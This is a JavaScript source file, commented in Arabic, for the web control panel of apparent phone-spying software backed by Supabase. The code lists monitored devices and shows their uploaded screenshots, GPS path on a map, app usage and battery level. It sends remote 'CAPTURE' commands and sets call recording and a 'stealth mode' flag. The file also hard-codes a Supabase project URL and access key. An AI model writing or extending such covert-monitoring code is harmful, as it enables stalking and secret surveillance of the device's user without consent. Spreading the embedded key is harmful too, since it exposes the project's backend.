const dbUrl = 'https://kubowqqqawkgghxcktoe.supabase.co';
const dbKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt1Ym93cXFxYXdrZ2doeGNrdG9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3MTIwNzksImV4cCI6MjA4OTI4ODA3OX0.RnKtHRnqrdh0wF4vl-LWQEjlw7uYDCThqAn23WBMafM';
let dbClient;

try {
    dbClient = supabase.createClient(dbUrl, dbKey);
} catch (e) {
    console.error("Supabase Init Error:", e);
}

let currentDeviceId = localStorage.getItem('last_device_id') || null;
let currentTab = 'reports';
let map = null;
let markers = [];
let pathLine = null;

// --- الدوال الأساسية (Declarations) ---

async function fetchDevices() {
    console.log("Fetching devices from remote_settings and locations...");
    try {
        // استخدام * لتفادي خطأ 406 في حال لم يتعرف الـ Cache على الأعمدة الجديدة
        const { data: settings, error: sError } = await dbClient.from('remote_settings').select('*');
        const { data: locations, error: lError } = await dbClient.from('locations').select('device_id').order('timestamp', { ascending: false }).limit(200);

        if (sError) console.warn("Settings fetch warning:", sError);
        
        const deviceList = document.getElementById('device-list');
        deviceList.innerHTML = '<div class="px-6 py-2 text-[10px] font-black text-slate-500 uppercase tracking-widest">الأجهزة النشطة</div>';

        const uniqueIds = [...new Set(locations?.map(d => d.device_id) || [])];
        const nicknameMap = {};
        
        if (settings) {
            settings.forEach(s => {
                if (s.device_id) nicknameMap[s.device_id] = s.nickname;
            });
        }

        if (uniqueIds.length > 0) {
            uniqueIds.forEach(id => {
                const name = nicknameMap[id] || id;
                const item = document.createElement('div');
                item.className = `device-item ${id === currentDeviceId ? 'active' : ''}`;
                item.innerHTML = `
                    <div class="status-dot status-online"></div>
                    <div class="flex-1 overflow-hidden">
                        <p class="font-bold text-sm truncate text-slate-100">${name}</p>
                        <p class="text-[9px] opacity-40 font-mono truncate">${id}</p>
                    </div>
                `;
                item.onclick = () => selectDevice(id);
                deviceList.appendChild(item);
            });
        }
    } catch (e) { console.error(e); }
}

async function selectDevice(deviceId) {
    currentDeviceId = deviceId;
    localStorage.setItem('last_device_id', deviceId);
    
    // استخدام * للحماية من خطأ 406
    const { data } = await dbClient.from('remote_settings').select('*').eq('device_id', deviceId).maybeSingle();
    document.getElementById('current-device-name').innerText = data?.nickname || "جهاز غير مسمى";
    document.getElementById('current-device-id').innerText = deviceId;
    
    document.querySelectorAll('.device-item').forEach(el => {
        el.classList.remove('active');
        if (el.innerHTML.includes(deviceId)) el.classList.add('active');
    });

    refreshCurrentData();
}

function switchTab(tabId) {
    currentTab = tabId;
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
    
    // ربط الأزرار بالعناوين العربية
    document.querySelectorAll('.tab-btn').forEach(btn => {
        if (tabId === 'reports' && btn.innerText.includes('التقارير')) btn.classList.add('active');
        if (tabId === 'positions' && btn.innerText.includes('المسار')) btn.classList.add('active');
        if (tabId === 'usage' && btn.innerText.includes('الاستخدام')) btn.classList.add('active');
        if (tabId === 'settings' && btn.innerText.includes('الإعدادات')) btn.classList.add('active');
    });

    document.getElementById(`tab-${tabId}`).classList.add('active');
    if (tabId === 'positions') setTimeout(initMap, 200);
    refreshCurrentData();
}

async function refreshCurrentData() {
    if (!currentDeviceId) return;
    try {
        const { data: latestLoc } = await dbClient.from('locations').select('*').eq('device_id', currentDeviceId).order('timestamp', { ascending: false }).limit(1).single();
        if (latestLoc) {
            document.getElementById('battery-bar').style.width = `${latestLoc.battery_level || 0}%`;
            document.getElementById('battery-text').innerText = `${latestLoc.battery_level || 0}%`;
            document.getElementById('last-seen-header').innerText = new Date(latestLoc.timestamp).toLocaleTimeString('ar-EG');
        }

        if (currentTab === 'reports') fetchReports();
        if (currentTab === 'positions') fetchPositions();
        if (currentTab === 'usage') fetchUsage();
        if (currentTab === 'settings') fetchSettings();
    } catch (e) { console.warn(e); }
}

// جلب الصور والتقارير
async function fetchReports() {
    const grid = document.getElementById('reports-grid');
    grid.innerHTML = '<div class="col-span-full py-20 text-center text-blue-400 animate-pulse">جاري جلب الصور...</div>';

    const { data: storageData } = await dbClient.storage.from('monitoring_data').list(`screenshots/${currentDeviceId}`, {
        limit: 12, sortBy: { column: 'created_at', order: 'desc' }
    });

    const { data: events } = await dbClient.from('device_events').select('*').eq('device_id', currentDeviceId).order('created_at', { ascending: false }).limit(10);

    grid.innerHTML = '';
    if (storageData) {
        storageData.forEach(file => {
            const { data: url } = dbClient.storage.from('monitoring_data').getPublicUrl(`screenshots/${currentDeviceId}/${file.name}`);
            const card = document.createElement('div');
            card.className = "glass rounded-3xl overflow-hidden border border-slate-700/50 hover:border-blue-500 transition cursor-pointer";
            card.innerHTML = `<img src="${url.publicUrl}" class="w-full aspect-video object-cover"><div class="p-4 text-[10px] text-slate-500">${new Date(file.created_at).toLocaleString('ar-EG')}</div>`;
            grid.appendChild(card);
        });
    }
    if (events) {
        events.forEach(ev => {
            const div = document.createElement('div');
            div.className = "glass p-5 rounded-3xl border-r-4 border-indigo-500";
            div.innerHTML = `<p class="text-xs font-bold text-indigo-400 uppercase">${ev.type}</p><p class="text-sm mt-1">${ev.details || "حدث نظام"}</p>`;
            grid.appendChild(div);
        });
    }
}

// الخرائط والمسار
function initMap() {
    if (map) return;
    map = L.map('map').setView([24.7136, 46.6753], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
}

async function fetchPositions() {
    if (!map) return;
    const { data } = await dbClient.from('locations').select('*').eq('device_id', currentDeviceId).order('timestamp', { ascending: false }).limit(50);
    markers.forEach(m => map.removeLayer(m));
    if (pathLine) map.removeLayer(pathLine);
    markers = [];
    if (data && data.length > 0) {
        const points = data.reverse().map(l => [l.latitude, l.longitude]);
        pathLine = L.polyline(points, {color: '#3b82f6', weight: 4}).addTo(map);
        const marker = L.marker(points[points.length - 1]).addTo(map).bindPopup("الموقع الأخير").openPopup();
        markers.push(marker);
        map.fitBounds(pathLine.getBounds());
    }
}

// سجل الاستخدام
async function fetchUsage() {
    const list = document.getElementById('usage-list');
    const { data } = await dbClient.from('app_usage').select('*').eq('device_id', currentDeviceId).order('created_at', { ascending: false }).limit(20);
    list.innerHTML = '';
    if (data && data.length > 0) {
        data.forEach(item => {
            const div = document.createElement('div');
            div.className = "flex justify-between items-center p-5 glass rounded-3xl mb-4";
            div.innerHTML = `<div><p class="font-bold">${item.app_name || 'تطبيق'}</p><p class="text-[10px] text-slate-500">${item.package_name}</p></div><div class="text-emerald-400 font-bold">${item.duration_minutes}m</div>`;
            list.appendChild(div);
        });
    }
}

// جلب الإعدادات
async function fetchSettings() {
    try {
        // استخدام select(*) بدلاً من تحديد أعمدة لتجنب 406
        const { data, error } = await dbClient.from('remote_settings').select('*').eq('device_id', currentDeviceId).maybeSingle();
        
        if (error) throw error;

        if (data) {
            if (document.getElementById('screenshot-interval')) document.getElementById('screenshot-interval').value = data.screenshot_interval_ms || 60000;
            if (document.getElementById('toggle-calls')) document.getElementById('toggle-calls').checked = data.record_calls || false;
            if (document.getElementById('toggle-stealth')) document.getElementById('toggle-stealth').checked = data.stealth_mode_active || false;
            if (document.getElementById('edit-nickname')) document.getElementById('edit-nickname').value = data.nickname || "";
        }
    } catch (e) {
        console.error("Settings fetch error:", e.message);
    }
}

// أوامر التحكم (Triggering Commands)
async function triggerCapture() {
    const btn = document.getElementById('trigger-capture-btn');
    if (!currentDeviceId) return alert("يرجى اختيار جهاز أولاً");
    
    // إشعار حالة علوي بسيط
    const statusBanner = document.createElement('div');
    statusBanner.className = "fixed top-10 left-1/2 -translate-x-1/2 glass p-4 rounded-2xl border border-blue-500 text-blue-400 z-50 text-sm font-bold animate-bounce";
    statusBanner.innerText = "🚀 جاري إرسال إشارة الالتقاط للهاتف...";
    document.body.appendChild(statusBanner);

    btn.innerText = "⏳ قيد الإرسال...";
    btn.disabled = true;

    try {
        const { error } = await dbClient.from('commands').insert({ 
            device_id: currentDeviceId, 
            command: 'CAPTURE', 
            status: 'PENDING',
            created_at: new Date().toISOString()
        });
        
        if (error) throw error;
        
        statusBanner.innerText = "📡 تم الإرسال! الهاتف سيقوم بالالتقاط الآن...";
        statusBanner.classList.replace('border-blue-500', 'border-emerald-500');
        statusBanner.classList.replace('text-blue-400', 'text-emerald-400');

        setTimeout(() => {
            btn.innerText = "📸 التقاط صورة فورية الآن";
            btn.disabled = false;
            statusBanner.remove();
            fetchReports(); // تحديث القائمة لرؤية الصورة الجديدة
        }, 15000); // إعطاء 15 ثانية للهاتف للرفع
        
    } catch (e) {
        alert("فشل إرسال الأمر: " + e.message);
        btn.disabled = false;
        btn.innerText = "📸 التقاط صورة فورية الآن";
        statusBanner.remove();
    }
}

// حفظ الاسم المستعار (Resilient Upsert)
async function saveNickname() {
    const newName = document.getElementById('edit-nickname').value;
    if (!currentDeviceId) return alert("لم يتم التعرف على معرف الجهاز");

    try {
        // استخدام upsert لضمان إنشاء السجل إذا لم يكن موجوداً
        const { error } = await dbClient.from('remote_settings').upsert({ 
            device_id: currentDeviceId, 
            nickname: newName,
            updated_at: new Date().toISOString()
        }, { onConflict: 'device_id' });

        if (error) throw error;
        
        alert("تم حفظ الاسم بنجاح! ✅");
        await fetchDevices();
        await selectDevice(currentDeviceId);
    } catch (e) {
        alert("خطأ أثناء الحفظ: " + e.message);
    }
}

// حفظ الإعدادات العامة
document.getElementById('save-settings')?.addEventListener('click', async () => {
    const updates = {
        screenshot_interval_ms: parseInt(document.getElementById('screenshot-interval').value),
        record_calls: document.getElementById('toggle-calls').checked,
        stealth_mode_active: document.getElementById('toggle-stealth').checked
    };
    await dbClient.from('remote_settings').update(updates).eq('device_id', currentDeviceId);
    alert("تم المزامنة ✅");
});

// التشغيل الابتدائي
window.onload = () => {
    initDashboard();
    setInterval(fetchDevices, 60000);
};

async function initDashboard() {
    await fetchDevices();
    if (currentDeviceId) selectDevice(currentDeviceId);
}
